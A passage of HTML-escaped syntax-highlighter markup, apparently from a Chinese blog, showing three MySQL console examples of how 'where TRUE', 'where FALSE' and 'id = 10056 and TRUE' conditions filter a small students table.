&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Doris&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3264196037603-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10058&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Jaune&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3264196037603-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10060&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Alisa&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3264196037603-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3264196037603-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0023 seconds] --&gt;
&lt;p&gt;1)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3267426790907&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from students where TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3267426790907-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3267426790907-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3267426790907-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3267426790907-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3267426790907-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3267426790907-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3267426790907-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3267426790907-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3267426790907-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3267426790907-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3267426790907-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3267426790907-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3267426790907-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3267426790907-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Doris&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3267426790907-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10058&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Jaune&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3267426790907-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10060&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Alisa&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3267426790907-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3267426790907-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0026 seconds] --&gt;
&lt;p&gt;2)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c326a255270320&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from students where FALSE ;
Empty set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c326a255270320-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c326a255270320-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c326a255270320-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c326a255270320-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;Empty &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0006 seconds] --&gt;
&lt;p&gt;3)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c326d965948521&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; SELECT * from students where id = 10056 and TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c326d965948521-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c326d965948521-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c326d965948521-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c326d965948521-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c326d965948521-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c326d965948521-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c326d965948521-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c326d965948521-1&quot;&gt;
